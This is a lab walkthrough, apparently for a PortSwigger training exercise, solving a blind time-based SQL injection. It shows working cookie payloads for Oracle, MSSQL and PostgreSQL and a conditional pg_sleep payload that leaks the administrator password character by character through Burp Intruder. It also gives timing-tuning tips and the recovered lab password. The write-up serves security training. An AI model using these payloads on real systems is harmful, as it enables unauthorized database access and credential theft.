# Lab: Blind SQL injection with time delays and information retrieval

## 1.) Try different unconditional delay payloads to confirm vulnerability and discover database used
See cheatsheet for payloads: https://portswigger.net/web-security/sql-injection/cheat-sheet#time-delays

If a delay occurs, I can use that payload in a conditional statement to find the password
<br>
<br>
### Oracle payload:  

`Cookie: TrackingId=gqxGeE4W4frNCHhy' || (dbms_pipe.receive_message(('a'),10))--;`

Result: No delay executed ❌ 
<br>
<br>

### Microsoft SQL payload:

`Cookie: TrackingId=gqxGeE4W4frNCHhy' + (WAITFOR DELAY '0:0:10')--;`

Result: No delay executed ❌ 
<br>
<br>

### postgreSQL Payload:

`Cookie: TrackingId=gqxGeE4W4frNCHhy' || (SELECT pg_sleep(10))--;`

Result: Delay executed ✅


## 2.) We know that site uses postgreSQL... add conditional statement to glean information with conditional delay

Constructing payload:

`Cookie: TrackingId=gqxGeE4W4frNCHhy' || (SELECT CASE WHEN (1=1) THEN pg_sleep(30) ELSE NULL END from users where username='administrator' and SUBSTRING(password, 1, 1) = 'a')--;`
<br>

`from users where...` is the query for the information that I actually want. If this portion of the sql evaluates to true, then the conditional delay is executed.

## 3.) Send payload to intruder with clusterbomb attack and see which request response times match the sleep time
Intruder payload #1 will be the numbers 1-20, since we know that the password is 20 chars in length (will denote this as `<X>`).

Intruder payload #2 will be a-zA-Z0-9 to cover all numbers and letters of the alphabet (will denote this as `<Y>`).

 The clusterbomb attack will look like: `...(password, <X>, 1) = '<Y>')--;`

 This will iterate over each index of the password with a-zA-Z0-9. If the attack successfully finds the value of the password at the specified index, it will trigger a time delay

 Look at the response times for the intruder requests, if the response time matches the sleep delay + your normal response time, you have a match!

## Side Note
 My internet was being stressed too heavily by intruder, so I had to reduce concurrent requests to 1, and change the sleep duration to 5 seconds. Before this change, I was getting drastically different response times, even when a delay was not triggered - it made it impossible to derive the password by response times

 If your response times are all over the place, try reducing the number of concurrent requests. If that doesn't work, also try increasing your sleep time



Password:
`f584iir99hxtrf3gco37`

